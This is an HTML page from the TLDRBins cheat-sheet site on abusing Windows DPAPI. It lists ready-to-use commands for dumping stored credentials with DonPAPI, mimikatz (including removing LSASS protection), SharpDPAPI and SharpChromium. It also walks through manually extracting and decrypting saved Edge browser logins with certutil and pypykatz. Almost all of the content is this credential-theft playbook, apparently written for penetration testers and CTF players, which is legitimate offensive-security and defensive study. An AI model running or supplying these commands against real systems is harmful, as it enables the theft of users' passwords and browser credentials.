<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>DPAPI | TLDRBins</title>
<meta name="robots" content='noindex, nofollow'>
<meta name="description" content="">
<meta name="generator" content="hugo-index">
<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
<script>
    window.addEventListener('load', () => {
        quicklink.listen();
    });
</script>

  </head>
  <body><header>
  <h1>
    <a href="https://tldrbins.github.io/">
      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
      <span>TLDRBins</span>
    </a>
    <span class="hl">/</span>
    <a href="https://tldrbins.github.io/dpapi/">
      <span>DPAPI</span>
    </a>
  </h1>
  <div class="js-toggle-wrapper">
    <div class="js-toggle">
        <div class="js-toggle-track">
            <div class="js-toggle-track-check">
                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
            </div>
            <div class="js-toggle-track-x">
                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
            </div>
        </div>
        <div class="js-toggle-thumb"></div>
        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
    </div>
</div>
    
<style>

 

.js-toggle-wrapper {
    display: table;

     
    float: right;
    margin-left: auto;
    margin-right: 0;
}

.js-toggle {
    touch-action: pan-x;
    display: inline-block;
    position: relative;
    cursor: pointer;
    background-color: transparent;
    border: 0;
    padding: 0;
    -webkit-touch-callout: none;
    user-select: none;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    -webkit-tap-highlight-color: transparent;
  }
  
  .js-toggle-screenreader-only {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
  }
  
  .js-toggle-track {
    width: 50px;
    height: 24px;
    padding: 0;
    border-radius: 30px;
    background-color: hsl(223, 61%, 44%);
    transition: all 0.2s ease;
  }
  
  .js-toggle-track-check {
    position: absolute;
    width: 17px;
    height: 17px;
    left: 5px;
    top: 0px;
    bottom: 0px;
    margin-top: auto;
    margin-bottom: auto;
    line-height: 0;
    opacity: 0;
    transition: opacity 0.25s ease;
  }
  
  .js-toggle--checked .js-toggle-track-check {
    opacity: 1;
    transition: opacity 0.25s ease;
  }

  .js-toggle--checked .js-toggle-track {
    background-color: hsl(222, 14%, 7%);
  }
  
  .js-toggle-track-x {
    position: absolute;
    width: 17px;
    height: 17px;
    right: 5px;
    top: 0px;
    bottom: 0px;
    margin-top: auto;
    margin-bottom: auto;
    line-height: 0;
    opacity: 1;
    transition: opacity 0.25s ease;
  }
  
  .js-toggle--checked .js-toggle-track-x {
    opacity: 0;
  }
  
  .js-toggle-thumb {
    position: absolute;
    top: 1px;
    left: 1px;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    background-color: #fafafa;
    box-sizing: border-box;
    transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0ms;
    transform: translateX(0);
  }
  
  .js-toggle--checked .js-toggle-thumb {
    transform: translateX(26px);
    border-color: #19ab27;
  }
</style>

<script>
    var body = document.body;
    var switcher = document.getElementsByClassName('js-toggle')[0];

    
    switcher.addEventListener("click", function() {
        this.classList.toggle('js-toggle--checked');
        
        if (this.classList.contains('js-toggle--checked')) {
            body.classList.add('dark-mode');
            
            localStorage.setItem('darkMode', 'true');
        } else {
            body.classList.remove('dark-mode');
            setTimeout(function() {
                localStorage.removeItem('darkMode');
            }, 100);
        }
    })

    
    if (localStorage.getItem('darkMode')) {
        
        switcher.classList.add('js-toggle--checked');
        body.classList.add('dark-mode');
    }

</script>
  <p class="desc"></p>
</header>
<div class="main">

<ul class="tagsList single">
  
  <li><a href="https://tldrbins.github.io/@dpapi/">DPAPI</a></li>
  
  <li><a href="https://tldrbins.github.io/@enum/">Enum</a></li>
  
  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
  
  <li><a href="https://tldrbins.github.io/@password/">Password</a></li>
  
  <li><a href="https://tldrbins.github.io/@credentials/">Credentials</a></li>
  
  <li><a href="https://tldrbins.github.io/@donpapi/">DonPAPI</a></li>
  
</ul>

<div class="content"><hr>
<h3 id="abuse-1-auto-dump-from-linux">Abuse #1: Auto dump (From Linux)</h3>
<p><a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DonPAPI collect -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -t &lt;TARGET&gt;
</span></span></code></pre></div><h3 id="abuse-1-auto-dump-from-windows---mimikatz">Abuse #1: Auto dump (From Windows - mimikatz)</h3>
<h4 id="1-info-gathering">1. Info Gathering</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect&#34;</span>
</span></span></code></pre></div><h4 id="2-secrets-dump">2. Secrets Dump</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;token::elevate&#34;</span> <span class="s2">&#34;!+&#34;</span> <span class="s2">&#34;!processprotect /process:lsass.exe /remove&#34;</span> <span class="s2">&#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;</span><span class="s1">&#39; &#39;</span><span class="s2">&#34;dpapi::masterkey /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;PROTECT_HASH&gt; /sid:&lt;SID&gt; /password:&lt;PASSWORD&gt; /protected&#34;</span><span class="s1">&#39; &#39;</span><span class="s2">&#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;</span><span class="err">&#39;</span> <span class="s2">&#34;exit&#34;</span>
</span></span></code></pre></div><h3 id="abuse-1-auto-dump-from-windows---sharpdpapiexe">Abuse #1: Auto dump (From Windows - SharpDPAPI.exe)</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run as system</span>
</span></span><span class="line"><span class="cl">.<span class="se">\S</span>harpDPAPI.exe machinetriage
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run as user</span>
</span></span><span class="line"><span class="cl">.<span class="se">\S</span>harpDPAPI.exe credentials /password:&lt;PASSWORD&gt;
</span></span></code></pre></div><h3 id="abuse-2-browser-saved-creds-automatic">Abuse #2: Browser Saved Creds (Automatic)</h3>
<p><a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe">SharpChromium.exe</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">SharpChromium</span><span class="p">.</span><span class="py">exe</span> <span class="n">logins</span>
</span></span></code></pre></div><h3 id="abuse-2-browser-saved-creds-manual">Abuse #2: Browser Saved Creds (Manual)</h3>
<h4 id="1-prepare-logindata-and-localstate-file">1. Prepare logindata and localstate file</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get Local State json file, copy and paste to local Linux</span>
</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="s2">&#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Local State&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get Login Data binary file</span>
</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-encode</span> <span class="s2">&#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Default\Login Data&#34;</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">logindata</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Copy and paste to local Linux</span>
</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">logindata</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Base64 decode</span>
</span></span><span class="line"><span class="cl">cat logindata_b64 <span class="p">|</span> base64 -d &gt; logindata
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Extract key from local state</span>
</span></span><span class="line"><span class="cl">cat localstate <span class="p">|</span> jq -r .os_crypt.encrypted_key <span class="p">|</span> base64 -d <span class="p">|</span> cut -c6- &gt; blob
</span></span></code></pre></div><p><a href="https://github.com/skelsec/pypykatz">pypykatz</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get masterkey_guid</span>
</span></span><span class="line"><span class="cl">pypykatz dpapi describe blob blob
</span></span></code></pre></div><h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get master key</span>
</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-encode</span> <span class="s2">&#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt;&#34;</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\&lt;</span><span class="n">MASTERKEY_GUID</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Copy and paste to local Linux</span>
</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\&lt;</span><span class="n">MASTERKEY_GUID</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Base64 decode</span>
</span></span><span class="line"><span class="cl">cat masterkey_guid_b64 <span class="p">|</span> base64 -d &gt; masterkey_guid
</span></span></code></pre></div><h4 id="3-decrypt">3. Decrypt</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pypykatz dpapi prekey password &lt;SID&gt; &lt;USER_PASSWORD&gt; <span class="p">|</span> tee pkf
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pypykatz dpapi masterkey &lt;MASTERKEY_GUID_FILE&gt; pkf -o mkf
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pypykatz dpapi chrome --logindata logindata mkf localstate
</span></span></code></pre></div><h3 id="abuse-3-decrpyt-masterkey-without-password">Abuse #3: Decrpyt Masterkey without password</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Take note: Last key</span>
</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;dpapi::masterkey /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /rpc&#34;</span> <span class="n">exit</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Decrypt</span>
</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;dpapi::cred /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /masterkey:&lt;KEY&gt;&#34;</span> <span class="n">exit</span>
</span></span></code></pre></div><br></div></div>
    
    <script src="/js/utils.js"></script>
    <footer>
    <hr>
    <div class="footer-text">
        <div>© 2024 TLDRBins</div>
        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
    </div>
</footer>
</body>
</html>
